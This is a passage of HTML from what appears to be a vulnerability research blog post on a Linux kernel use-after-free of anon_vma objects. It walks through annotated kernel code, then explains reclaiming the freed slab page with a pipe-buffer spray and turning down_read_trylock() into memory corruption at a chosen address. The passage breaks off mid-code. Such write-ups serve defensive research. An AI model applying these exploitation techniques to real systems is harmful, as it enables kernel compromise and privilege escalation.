normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">the commit</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> that introduced the bug are great resources in order to gain additional context.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Setting the scene</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Successfully triggering the underlying vulnerability causes </span><span style="background-color: #b4a7d6; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">folio-&gt;mapping</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> to point to a freed </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> object. Calling </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">madvise(..., MADV_PAGEOUT)</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">can then be used to repeatedly trigger accesses to the freed </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> in </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">folio_lock_anon_vma_read()</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">:</span></p><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct anon_vma *folio_lock_anon_vma_read(struct folio *folio,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp; struct rmap_walk_control *rwc)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct anon_vma *anon_vma = NULL;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct anon_vma *root_anon_vma;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">unsigned long anon_mapping;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rcu_read_lock();</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_mapping = (unsigned long)READ_ONCE(</span><span style="background-color: #b4a7d6; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">folio-&gt;mapping</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if ((anon_mapping &amp; PAGE_MAPPING_FLAGS) != PAGE_MAPPING_ANON)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">goto out;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if (!folio_mapped(folio))</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">goto out;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">// anon_vma is dangling pointer</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="background-color: cyan; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> = (struct anon_vma *) (anon_mapping - PAGE_MAPPING_ANON);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">// root_anon_vma is read from dangling pointer</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="background-color: #f6b26b; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">root_anon_vma</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> = READ_ONCE(</span><span style="background-color: cyan; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">-&gt;root);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if (</span><span style="background-color: #ea9999; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">down_read_trylock</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(&amp;</span><span style="background-color: #f6b26b; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">root_anon_vma</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">-&gt;rwsem)) {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[...]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if (!folio_mapped(folio)) { </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">// false</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[...]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">goto out;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if (rwc &amp;&amp; rwc-&gt;try_lock) { </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">// true</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma = NULL;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rwc-&gt;contended = true;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">goto out;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[...]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">out:</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rcu_read_unlock();</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">return </span><span style="background-color: cyan; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"> // return dangling pointer</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">One potential exploit technique is to let the function return the dangling </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> pointer and try to make the subsequent operations do something useful. Instead, we chose to use the </span><span style="background-color: #ea9999; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">down_read_trylock()</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> call within the function to corrupt memory at a chosen address, which we can do if we can control the </span><span style="background-color: #f9cb9c; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">root_anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> pointer that is read from the freed </span><span style="background-color: cyan; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Controlling the </span><span style="background-color: #f9cb9c; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">root_anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> pointer means reclaiming the freed </span><span style="background-color: cyan; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> with attacker-controlled memory. </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> structures are allocated from their own kmalloc cache, which means we cannot simply free one and reclaim it with a different object. Instead we cause the associated </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> slab page to be returned back to the kernel page allocator by following a very similar strategy to the one documented </span><a href="https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">here</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. By freeing all the </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> objects on a slab page, then flushing the percpu slab page partial freelist, we can cause the virtual memory previously associated with the </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> to be returned back to the page allocator. We then spray pipe buffers in order to reclaim the freed </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> with attacker controlled memory.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">At this point, weve discussed how to turn our use-after-free into a </span><span style="background-color: #ea9999; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">down_read_trylock()</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> call on an attacker-controlled pointer. The implementation of </span><span style="background-color: #ea9999; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">down_read_trylock()</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> is as follows:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #9c27b0; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">rw_semaphore</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #616161; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;">	</span></span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">atomic_long_t</span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: #0055aa; font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: 